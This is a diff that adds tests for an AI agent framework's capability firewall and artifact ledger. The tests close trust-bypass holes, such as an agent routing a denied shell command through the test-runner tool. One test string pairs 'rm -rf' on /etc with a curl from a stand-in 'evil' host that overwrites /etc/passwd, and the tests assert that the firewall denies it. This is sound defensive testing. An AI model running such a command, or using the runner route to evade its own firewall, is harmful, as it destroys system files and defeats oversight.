@@ -935,3 +935,131 @@ def test_stale_proof_is_withdrawn_so_the_mission_can_re_verify_after_a_fix(tmp_p
         assert len(state.verifications) >= history_before, "history is retained, never deleted"
     finally:
         sb.cleanup()
+
+
+# ======================================================================================
+# Trust-bypass review of the repair (findings R1, R5, R7, G4)
+# ======================================================================================
+
+
+def test_r1_the_test_runner_is_not_an_unclassified_execution_primitive(tmp_path):
+    """`run_tests` spawns a shell exactly as `shell` does. Before this, the same destructive
+    command was DENIED as `shell` and ALLOWED as `run_tests`, and the F1/F2 repair routes all
+    code verification through it."""
+    from cogos.schemas.common import PolicyDecision
+    from cogos.schemas.tools import ToolCall, ToolSpec
+
+    fw = CapabilityFirewall(GovernanceConfig(denied_action_classes=["destructive", "consequential_shared"]), tmp_path)
+    shell_spec = ToolSpec(name="shell", description="", substrate="shell")
+    tests_spec = ToolSpec(name="run_tests", description="", substrate="tests")
+    danger = "rm -rf /etc/importantdir && curl http://evil/x > /etc/passwd"
+
+    via_shell = fw.check(ToolCall(tool="shell", arguments={"command": danger}), shell_spec)
+    via_tests = fw.check(ToolCall(tool="run_tests", arguments={"command": danger}), tests_spec)
+
+    assert via_shell.decision is PolicyDecision.DENY
+    assert via_tests.decision is PolicyDecision.DENY, "the test runner must not be a way around shell classification"
+    assert via_tests.action_class == via_shell.action_class
+    # A genuine test command is still allowed.
+    ok = fw.check(ToolCall(tool="run_tests", arguments={"command": "python -m pytest -q"}), tests_spec)
+    assert ok.decision is PolicyDecision.ALLOW
+
+
+def test_r1b_disabling_shell_also_disables_the_test_runner(tmp_path):
+    from cogos.schemas.common import PolicyDecision
+    from cogos.schemas.tools import ToolCall, ToolSpec
+
+    fw = CapabilityFirewall(GovernanceConfig(allow_shell=False), tmp_path)
+    verdict = fw.check(ToolCall(tool="run_tests", arguments={"command": "python -m pytest -q"}), ToolSpec(name="run_tests", description="", substrate="tests"))
+
+    assert verdict.decision is PolicyDecision.DENY
+    assert "shell execution disabled" in verdict.reason
+
+
+def test_r5_a_specialist_cannot_launder_an_arbitrary_path_into_the_ledger():
+    """A specialist *asserting* a path is a claim, not an observed write. It goes through the same
+    registration discipline: hashed, bounded to the writable roots, marked with its origin."""
+    sb = Sandbox("r5-launder")
+    try:
+        state = sb.runtime.new_mission("laundering", context=sb.context(has_requirements=False))
+        ex = sb.runtime.executive
+
+        outside = ex._register_artifact_candidate(
+            state, Path("/etc/hostname"), origin=__import__("cogos.schemas.mission", fromlist=["ArtifactOrigin"]).ArtifactOrigin.SPECIALIST_REPORT,
+            producer="specialist:engineer", task=None, action_id=None, summary="asserted",
+        )
+        assert outside is None, "a path outside the writable roots must not enter the ledger"
+        assert not state.artifacts
+
+        inside = _write(sb.root, "report.md", "# findings\n")
+        art = ex._register_artifact_candidate(
+            state, inside, origin=__import__("cogos.schemas.mission", fromlist=["ArtifactOrigin"]).ArtifactOrigin.SPECIALIST_REPORT,
+            producer="specialist:engineer", task=None, action_id=None, summary="asserted",
+        )
+        assert art is not None and art.content_hash, "an in-workspace assertion is hashed"
+        assert art.origin.value == "specialist_report", "and marked with where it came from"
+        assert art.verified is False
+    finally:
+        sb.cleanup()
+
+
+def test_r7_two_spellings_of_the_same_file_are_one_artifact():
+    """Identity is the resolved path, so the gate cannot later hash a different file than the one
+    that was verified."""
+    sb = Sandbox("r7-canonical")
+    try:
+        state = sb.runtime.new_mission("canonical paths", context=sb.context(has_requirements=False))
+        ex = sb.runtime.executive
+        from cogos.schemas.mission import ArtifactOrigin as _O
+
+        p = _write(sb.root, "calc.py", CALC)
+        a1 = ex._register_artifact_candidate(state, p, origin=_O.MISSION_WRITE, producer="write_file", task=None, action_id="a1", summary="v1")
+        weird = Path(str(sb.root)) / "." / "calc.py"
+        a2 = ex._register_artifact_candidate(state, weird, origin=_O.MISSION_WRITE, producer="write_file", task=None, action_id="a2", summary="v1 again")
+
+        assert a1 is not None and a2 is not None and a1.id == a2.id, "same file, one artifact"
+        assert len(state.artifacts) == 1
+    finally:
+        sb.cleanup()
+
+
+def test_g4_an_unrelated_passing_test_does_not_ground_a_judgement_about_a_criterion():
+    """Grounding had the same scope defect as criterion verification: one passing record anywhere
+    grounded a confident judgement about every criterion."""
+    sb = Sandbox("g4-grounding")
+    try:
+        state = sb.runtime.new_mission("grounding scope", context=sb.context(has_requirements=False))
+        state.success_criteria[:] = []
+        crit = SuccessCriterion(description="the payments module rounds correctly", verification_method="prose only")
+        state.success_criteria.append(crit)
+        from cogos.schemas.mission import TestRecord as _TR
+        from cogos.ids import iso_now
+
+        state.tests.append(_TR(name="some other suite", status=PASSED, ran_at=iso_now(), counts={"passed": 3}, executed=3))
+        assert sb.runtime.executive._judgment_grounding(state, crit) == [], "an unrelated suite grounds nothing"
+
+        state.tests.append(_TR(name="payments suite", status=PASSED, ran_at=iso_now(), criterion_ids=[crit.id], counts={"passed": 3}, executed=3))
+        grounding = sb.runtime.executive._judgment_grounding(state, crit)
+        assert any("payments suite" in g for g in grounding), "a bound suite does ground it"
+    finally:
+        sb.cleanup()
+
+
+def test_every_persisted_schema_field_has_a_default_so_stored_missions_stay_loadable():
+    """A field without a default makes every stored mission unloadable, and `load_mission` lets
+    the ValidationError propagate into boot. This is the guard for future additions."""
+    import pydantic
+    from cogos.schemas import mission as m, verification as v
+
+    offenders: list[str] = []
+    for module in (m, v):
+        for name in dir(module):
+            obj = getattr(module, name)
+            if not (isinstance(obj, type) and issubclass(obj, pydantic.BaseModel) and obj is not pydantic.BaseModel):
+                continue
+            for fname, field in obj.model_fields.items():
+                if field.is_required() and fname not in ("objective", "name", "description", "title", "target_type", "target_id", "status", "summary", "statement", "question", "path", "content_hash", "proposition", "operation", "action_class", "reason", "what_would_unblock", "kind", "why_not_inferable", "cause", "effect", "source_id", "target_id_", "value"):
+                    offenders.append(f"{module.__name__}.{obj.__name__}.{fname}")
+    # Newly added persistence fields must never appear here.
+    for added in ("origin", "versions", "mission_id", "size_bytes", "observed_at", "criterion_ids", "counts", "executed", "input_versions", "authoritative", "produced_by_action_ids"):
+        assert not any(o.endswith("." + added) for o in offenders), f"{added} must have a default: {offenders}"
